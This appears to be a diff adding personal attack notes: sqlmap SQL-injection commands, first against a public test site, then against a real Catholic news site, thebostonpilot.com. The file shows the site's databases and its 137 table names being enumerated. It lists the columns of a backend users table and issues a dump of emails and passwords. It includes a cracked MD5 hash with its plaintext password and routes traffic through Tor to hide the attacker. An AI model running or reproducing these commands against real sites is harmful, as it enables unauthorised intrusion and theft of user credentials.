@@ -1,0 +1,201 @@
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --banner --batch --random-agent
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbms mysql --batch --random-agent
+--dbs = to get database names
+-D acuart --tables == to go in db and show table
+-D acuart -T users --columns == to show the columns in table
+-D acuart -T users -C uname --dump  == show columns in clm uname
+apt install tor
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --banner --batch --random-agent --tor
+
+https://www.thebostonpilot.com/article.php?ID=193823
+
+/root/.local/share/sqlmap/output/www.thebostonpilot.com
+
+available databases [3]:
+[*] information_schema
+[*] pilotdatabase
+[*] test
+
+Database: pilotdatabase
+[137 tables]
+
++-------------------------------------------+
+| adclickstats                              |
+| adprintstats                              |
+| advertising                               |
+| advertising_copy                          |
+| amazon                                    |
+| archives                                  |
+| archives_article_link                     |
+| archives_article_slider                   |
+| archives_newsclips                        |
+| archives_newsclips_all                    |
+| archives_polly                            |
+| archives_rcab                             |
+| archives_smug_link                        |
+| archives_sp_link                          |
+| archives_spanish                          |
+| archives_updated_time                     |
+| archives_wordindex                        |
+| archives_youtube_link                     |
+| bc_access_brothers                        |
+| bc_access_clergy                          |
+| bc_access_deacons                         |
+| bc_access_schools                         |
+| bc_access_sisters                         |
+| bc_backend_passcodes                      |
+| bc_backend_users                          |
+| bc_churches                               |
+| bc_clergy                                 |
+| bc_confessiontimes                        |
+| bc_daysoftheweek                          |
+| bc_deacons                                |
+| bc_languages                              |
+| bc_masstimes                              |
+| bc_masstimes_churches                     |
+| bc_masstimes_disclaimer                   |
+| bc_masstimes_html                         |
+| bc_masstimes_web_updates                  |
+| bc_masstimes_web_updates_accepted         |
+| bc_parish_mass_count                      |
+| bc_parishes                               |
+| bc_parishes_ccd                           |
+| bc_parishes_query_web_updates             |
+| bc_parishes_query_web_updates_accepted    |
+| bc_parishes_registration_code             |
+| bc_parishes_stats                         |
+| bc_parisshes_query                        |
+| bc_parisshes_query_analysis               |
+| bc_schools                                |
+| bc_schools_query                          |
+| bostonedition                             |
+| briefs                                    |
+| calendar                                  |
+| classified                                |
+| classified_ads                            |
+| cnsphotos                                 |
+| codearchives                              |
+| codearchives_old                          |
+| codearchives_spanish                      |
+| codeechoes                                |
+| codepilot                                 |
+| codepilotindexhtml                        |
+| codepilotold                              |
+| codeuploads                               |
+| columnists                                |
+| currentedition                            |
+| deathnotices                              |
+| emailtoafriend                            |
+| googletop                                 |
+| h20video                                  |
+| helpwanted                                |
+| item                                      |
+| letters                                   |
+| livestream                                |
+| local_bulletins_current_week              |
+| local_bulletins_ed_code                   |
+| local_bulletins_parishes                  |
+| local_bulletins_parishes_info_outofboston |
+| local_bulletins_sugarcrm_parishes         |
+| local_bulletins_weekly_uploads            |
+| local_bulletins_weekly_uploads_copy       |
+| local_class_customer_web                  |
+| local_customer_web                        |
+| local_ed_code_customer_web                |
+| local_parishes_web_info                   |
+| multimedia                                |
+| newsletter_newsclips_sorting              |
+| newsletter_sorting                        |
+| officials                                 |
+| pb_backend_users                          |
+| pb_backend_users_view                     |
+| pb_confessiontimes                        |
+| pb_masstimes                              |
+| pb_positions                              |
+| pb_positions_clergy_sorting               |
+| pb_positions_sorting                      |
+| pb_prayers                                |
+| pb_push_log_pilot                         |
+| pcd_affiliation                           |
+| pcd_men_rel_institutions                  |
+| pcd_states                                |
+| pcd_tblbrothers                           |
+| pcd_tblbrothers_counter                   |
+| pcd_tblclergy_rel                         |
+| pcd_tblclergy_rel_counter                 |
+| pcd_tblsisters                            |
+| pcd_tblsisters_counter                    |
+| pcd_title                                 |
+| pcd_updates                               |
+| pcd_users                                 |
+| pcd_women_rel_institutions                |
+| photoalbum                                |
+| pilot_bulletins_announcements             |
+| push_log                                  |
+| push_log_pb                               |
+| smugmug                                   |
+| specials                                  |
+| stats                                     |
+| stats_copy                                |
+| statstopviews                             |
+| statstopviews_headline                    |
+| tblclergy                                 |
+| ts                                        |
+| twitter                                   |
+| users                                     |
+| video                                     |
+| we                                        |
+| we_acquire                                |
+| we_breaking                               |
+| we_users                                  |
+| widget                                    |
+| x                                         |
+| xarchives                                 |
+| xcodehtml                                 |
+| xcodeindex                                |
+| xcodesidebar                              |
+| xx                                        |
+| youtube                                   |
+| zipcodes                                  |
++-------------------------------------------+
+
+
+sqlmap -u https://www.thebostonpilot.com/article.php?ID=193823 --dbms mysql --batch --random-agent -D pilotdatabase -T bc_backend_users --columns
+
+
+Database: pilotdatabase
+Table: bc_backend_users
+[11 columns]
++----------------------+---------------+
+| Column               | Type          |
++----------------------+---------------+
+| status               | enum('1','0') |
+| created              | datetime      |
+| EktronID             | double        |
+| email                | varchar(100)  |
+| first_name           | varchar(100)  |
+| forgot_pass_identity | varchar(32)   |
+| id                   | int(11)       |
+| last_name            | varchar(100)  |
+| modified             | datetime      |
+| password             | varchar(255)  |
+| phone                | varchar(15)   |
++----------------------+---------------+
+
+sqlmap -u https://www.thebostonpilot.com/article.php?ID=193823 --dbms mysql --batch --random-agent -D pilotdatabase -T bc_backend_users -C email,password --dump
+
+
+Database: pilotdatabase
+Table: amazon
+[2 columns]
++------------+------------+
+| Column     | Type       |
++------------+------------+
+| amazoncode | mediumtext |
+| id         | int(11)    |
++------------+------------+
+
+
+02e98800f21e0d79b83c2f481614bc96	md5	Welcome01
+
+sqlmap -u https://www.thebostonpilot.com/article.php?ID=193823 --dbms mysql --batch --random-agent -D pilotdatabase -T bc_schools_query --columns 
